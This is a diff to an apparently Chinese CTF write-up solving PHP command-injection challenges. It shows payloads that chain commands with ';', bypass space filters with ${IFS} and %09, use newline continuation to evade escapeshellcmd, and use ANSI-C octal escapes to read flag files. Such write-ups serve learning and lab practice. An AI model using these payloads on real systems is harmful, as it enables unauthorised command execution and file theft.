@@ -90,14 +90,51 @@ PSOT:cmd=127.0.0.1;ls     查目录
 在../../../目录下有flag
 cmd=127.0.0.1;cat ../../../flag
 
+**ezcmd_2**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781404117711_image.png)
+system($cmd." >/dev/null 2>&1");无回显
+
+可以使用结束符来截断">/dev/null 2>&1"
+
+**`;`**  **`&&`**  **`||`**  
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781404330889_image.png)
 
 
+**EZCMD_3**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781405067227_image.png)
+
+[strpos](https://www.php.net/manual/zh/function.strpos.php):查找字符串首次出现的位置
+在这里是过滤空格的意思【strpos($cmd, ' ') !== false】
+
+可以使用`%09` `%0a` ``${IFS}``绕过
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781421945075_image.png)
 
 
+**EZCMD_4**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781422684089_image.png)
+robot文件告诉爬虫哪些页面可以抓，**哪些不能抓**
+url/robot.txt知道下一步
 
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781422771968_image.png)
+过滤多的离谱，其实也没使用
+[escapeshellcmd](https://www.php.net/manual/zh/function.escapeshellcmd.php)
+这个函数会在`%0a`时添加反斜杠
+反斜杠 `\` + 换行符 `%0a`，会被 Shell 解析为  **行延续符**，直接忽略这两个字符本身，把上下两行拼接成一条完整命令
+用换行符来绕过过滤
+```
+cmd=ca
+t /fl
+ag
 
+```
+注意：要用发包工具去发送post。这里不能用 hackbar 传参
 
-
+**EZCMD_5**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781424039478_image.png)
+[ANSI-C在线编码](https://xobear.cn/CTF/Web/PHP/ansi-c-encode.html)注意编码后的是16进制，还需要转为八进制
+没有过滤数字的无字母 RCE，使用 ANSI-C 风格的转义，格式为 ** $'...' ** ，省略号中用八进制
+`cmd=$'\143\141\164' $'\57\146\154\141\147\56\164\170\164'`
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781426578446_image.png)
 
 
 
